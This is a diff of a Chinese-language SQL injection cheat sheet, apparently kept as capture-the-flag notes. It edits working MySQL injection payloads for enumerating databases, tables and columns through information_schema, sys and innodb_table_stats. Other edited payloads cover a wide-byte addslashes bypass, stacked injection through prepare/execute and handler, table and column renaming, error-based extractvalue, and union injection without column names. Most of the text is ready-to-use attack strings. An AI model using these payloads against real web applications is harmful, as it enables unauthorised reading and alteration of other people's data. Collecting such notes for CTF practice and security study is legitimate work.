@@ -1,6 +1,6 @@
 # SQli
 
-常规方法利用information\_schema
+- 常规方法利用``information_schema``
 
 ```sql
 #爆库
@@ -13,7 +13,7 @@ select group_concat(column_name) from information_schema.columns where table_nam
 select group_concat(<column name>) from <table name>
 ```
 
-mysql &gt; 5.6 版本 利用sys库
+- mysql &gt; 5.6 版本 利用sys库
 
 ```sql
 # 爆表
@@ -26,7 +26,7 @@ select group_concat(table_name)from sys.schema_auto_increment_columns where tabl
 select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
 ```
 
-mysql &gt; 5.5 利用`innodb_table_stats`
+- mysql &gt; 5.5 利用`innodb_table_stats`
 
 ```sql
 # 爆表
@@ -57,23 +57,18 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
   原理就是 addslash后变成``%df%5c%27``了
 
-* `select .` bypass 一般是堆叠注入
+* multisql 堆叠注入
 
   * 利用show
+    ```sql
+    show databases;
+    show tables;
+    ```
 
   * 利用set prepare
 
     ```sql
-    @t=(sql 查询语句的hex值);prepare x from @t;execute x;#
-    ```
-
-    bypass进行堆叠注入
-
-    ```python
-    python
-    >>> import binascii
-    >>> binascii.b2a_hex("select * from supersqli.1919810931114514")
-    '73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134'
+    set @t=(<sqli>);prepare x from @t;execute x;#
     ```
 
   * 利用handler(MySQL)
@@ -97,6 +92,15 @@ select group_concat(table_name) from mysql.innodb_table_stats
     handler <handlername> read next; #读取指定表/句柄的下一行数据
     ...
     handler <handlername> close; #关闭句柄
+    ```
+  * ``alter rename``利用
+
+    ```sql
+    -- 修改表名(将表名user改为users)
+    alter table user rename to users;
+
+    -- 修改列名(将字段名username改为name)
+    alter table users change uesrname name varchar(30);
     ```
 
 * 看回显点
@@ -141,7 +145,7 @@ select group_concat(table_name) from mysql.innodb_table_stats
   * `extractvalue(1,concat(1,<SQli>))`
 
 * 无列名注入  
-  考虑这样的表格，使用select 1,2,3,4,5 union select \* from persons可以得到一张新的表格
+  考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格
 
   ```
   MariaDB [test]> select * from persons;
